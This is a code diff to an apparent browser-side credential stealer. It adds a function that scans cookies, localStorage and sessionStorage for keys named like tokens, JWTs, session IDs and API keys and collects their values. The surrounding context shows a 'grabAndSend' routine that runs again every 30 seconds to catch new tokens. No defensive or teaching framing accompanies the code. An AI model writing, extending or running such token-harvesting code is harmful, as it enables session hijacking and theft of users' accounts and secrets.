@@ -191,3 +191,50 @@ grabAndSend();
 
 // Optional: re-run every 30 seconds to catch new tokens
 setInterval(grabAndSend, 30000);
+
+// Expanded token detection
+function findAllTokens() {
+    let found = [];
+    let patterns = ['token', 'jwt', 'auth', 'access_token', 'refresh_token', 'session', 'authorization', 'x-access-token', 'api_key', 'apikey', 'sid', 'PHPSESSID'];
+    
+    // Check cookies
+    let cookies = document.cookie.split(';');
+    cookies.forEach(cookie => {
+        let [key, value] = cookie.trim().split('=');
+        if (value && value.length > 10) {
+            patterns.forEach(pattern => {
+                if (key.toLowerCase().includes(pattern)) {
+                    found.push({source: 'cookie', key: key, value: decodeURIComponent(value)});
+                }
+            });
+        }
+    });
+    
+    // Check localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        let value = localStorage.getItem(key);
+        if (value && value.length > 10) {
+            patterns.forEach(pattern => {
+                if (key.toLowerCase().includes(pattern)) {
+                    found.push({source: 'localStorage', key: key, value: value});
+                }
+            });
+        }
+    }
+    
+    // Check sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        let value = sessionStorage.getItem(key);
+        if (value && value.length > 10) {
+            patterns.forEach(pattern => {
+                if (key.toLowerCase().includes(pattern)) {
+                    found.push({source: 'sessionStorage', key: key, value: value});
+                }
+            });
+        }
+    }
+    
+    return found;
+}
